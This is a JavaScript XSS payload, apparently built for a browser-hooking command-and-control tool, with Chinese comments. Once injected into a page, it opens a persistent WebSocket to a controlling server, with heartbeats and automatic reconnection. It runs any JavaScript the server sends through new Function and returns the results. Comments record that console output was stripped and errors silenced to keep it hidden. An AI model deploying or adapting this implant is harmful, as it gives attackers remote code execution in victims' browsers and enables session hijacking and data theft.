(function() {
    // 防止重复加载
    if (window.xssPayloadLoaded) return;
    window.xssPayloadLoaded = true;

    // 配置
    const config = {
        serverUrl: 'ws://localhost:8080/ws',
        heartbeatInterval: 30000, // 30秒心跳
        reconnectInterval: 5000,  // 5秒重连
        maxReconnectAttempts: 10
    };

    let ws = null;
    let clientId = null;
    let heartbeatTimer = null;
    let reconnectTimer = null;
    let reconnectAttempts = 0;

    // 初始化连接
    function init() {
        connect();
    }

    // 建立 WebSocket 连接
    function connect() {
        try {
            ws = new WebSocket(config.serverUrl);
            
            ws.onopen = function() {
                reconnectAttempts = 0;
                startHeartbeat();
            };

            ws.onmessage = function(event) {
                try {
                    const message = JSON.parse(event.data);
                    handleMessage(message);
                } catch (e) {
                    console.error('[XSS] Failed to parse message:', e);
                }
            };

            ws.onclose = function() {
                stopHeartbeat();
                scheduleReconnect();
            };

            ws.onerror = function(error) {
                // 静默处理错误
            };

        } catch (e) {
            scheduleReconnect();
        }
    }

    // 处理服务器消息
    // 处理服务器消息
    function handleMessage(message) {
        switch (message.type) {
            case 'init':
                clientId = message.clientId;
                // 移除控制台输出
                break;
                
            case 'heartbeat_ack':
                // 心跳响应，无需处理
                break;
                
            default:
                // 处理任务执行
                if (message.id && message.code) {
                    executeTask(message);
                }
                break;
        }
    }

    // 执行任务
    function executeTask(task) {
        // 移除控制台输出
        
        try {
            let result;
            
            // 直接执行代码，不需要包装在 return 语句中
            const executeCode = new Function(task.code);
            result = executeCode();
            
            // 如果结果是 Promise，等待完成
            // 如果结果是 Promise，等待完成
            if (result && typeof result.then === 'function') {
                result.then(res => {
                    sendResult(task.id, res);
                }).catch(err => {
                    sendResult(task.id, null, err.message);
                });
            } else {
                sendResult(task.id, result);
            }
            
        } catch (error) {
            // 移除控制台错误输出
            sendResult(task.id, null, error.message);
        }
    }

    // 发送执行结果
    function sendResult(taskId, result, error = null) {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;
        
        const message = {
            type: 'result',
            taskId: taskId,
            result: result ? String(result) : '',
            error: error
        };
        
        try {
            ws.send(JSON.stringify(message));
        } catch (e) {
            // 移除控制台错误输出
        }
    }

    // 发送心跳
    // 发送心跳
    function sendHeartbeat() {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;
        
        try {
            ws.send(JSON.stringify({ type: 'heartbeat' }));
        } catch (e) {
            // 移除控制台错误输出
        }
    }

    // 启动心跳
    function startHeartbeat() {
        stopHeartbeat();
        heartbeatTimer = setInterval(sendHeartbeat, config.heartbeatInterval);
    }

    // 停止心跳
    function stopHeartbeat() {
        if (heartbeatTimer) {
            clearInterval(heartbeatTimer);
            heartbeatTimer = null;
        }
    }

    // 计划重连
    // 计划重连
    function scheduleReconnect() {
        if (reconnectAttempts >= config.maxReconnectAttempts) {
            // 移除控制台输出
            return;
        }
        
        if (reconnectTimer) return;
        
        reconnectTimer = setTimeout(() => {
            reconnectTimer = null;
            reconnectAttempts++;
            // 移除控制台输出
            connect();
        }, config.reconnectInterval);
    }

    // 页面卸载时清理
    window.addEventListener('beforeunload', function() {
        if (ws) {
            ws.close();
        }
        stopHeartbeat();
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
        }
    });

    // 启动
    init();

})();